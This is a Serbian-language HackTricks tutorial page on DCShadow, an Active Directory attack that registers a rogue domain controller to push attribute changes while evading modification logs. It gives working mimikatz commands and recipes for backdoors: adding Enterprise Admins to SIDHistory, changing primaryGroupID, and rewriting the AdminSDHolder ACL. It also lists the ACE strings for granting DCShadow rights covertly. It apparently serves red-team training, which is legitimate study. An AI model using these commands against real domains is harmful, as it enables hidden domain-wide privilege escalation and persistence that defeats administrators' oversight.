{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Registruje **novi Kontroler domena** u AD i koristi ga da **gurne atribute** (SIDHistory, SPNs...) na specificirane objekte **bez** ostavljanja bilo kakvih **logova** u vezi sa **modifikacijama**. **Potrebne su DA** privilegije i morate biti unutar **root domena**.\
Imajte na umu da ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.

Da biste izvršili napad, potrebne su vam 2 instance mimikatz. Jedna od njih će pokrenuti RPC servere sa SYSTEM privilegijama (ovde morate naznačiti promene koje želite da izvršite), a druga instanca će se koristiti za guranja vrednosti:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Napomena da **`elevate::token`** neće raditi u `mimikatz1` sesiji jer je to podiglo privilegije niti, ali nam je potrebno da podignemo **privilegiju procesa**.\
Takođe možete odabrati i "LDAP" objekat: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Možete primeniti promene iz DA ili od korisnika sa ovim minimalnim dozvolama:

- U **objektu domena**:
- _DS-Install-Replica_ (Dodaj/Ukloni Repliku u Domen)
- _DS-Replication-Manage-Topology_ (Upravljanje Replikacionom Topologijom)
- _DS-Replication-Synchronize_ (Replikaciona Sinhronizacija)
- **Objekat Lokacija** (i njeni podobjekti) u **Konfiguracionom kontejneru**:
- _CreateChild and DeleteChild_
- Objekat **računara koji je registrovan kao DC**:
- _WriteProperty_ (Ne Write)
- **Ciljni objekat**:
- _WriteProperty_ (Ne Write)

Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da dodelite ove privilegije korisniku bez privilegija (napomena da će ovo ostaviti neke logove). Ovo je mnogo restriktivnije od imanja DA privilegija.\
Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ovo znači da korisničko ime _**student1**_ kada se prijavi na mašinu _**mcorp-student1**_ ima DCShadow dozvole nad objektom _**root1user**_.

## Korišćenje DCShadow za kreiranje zadnjih vrata
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Dodeljivanje DCShadow dozvola koristeći DCShadow (bez izmenjenih logova dozvola)

Moramo dodati sledeće ACE-ove sa SID-om našeg korisnika na kraju:

- Na objektu domena:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Na objektu računara napadača: `(A;;WP;;;UserSID)`
- Na objektu ciljnog korisnika: `(A;;WP;;;UserSID)`
- Na objektu Lokacije u Konfiguracionom kontejneru: `(A;CI;CCDC;;;UserSID)`

Da biste dobili trenutni ACE objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Obratite pažnju da u ovom slučaju treba da napravite **several changes,** ne samo jedan. Dakle, u **mimikatz1 sesiji** (RPC server) koristite parametar **`/stack` sa svakom izmenom** koju želite da napravite. Na ovaj način, biće vam potrebna samo **`/push`** jednom da izvršite sve zadržane promene na lažnom serveru.

[**Više informacija o DCShadow na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
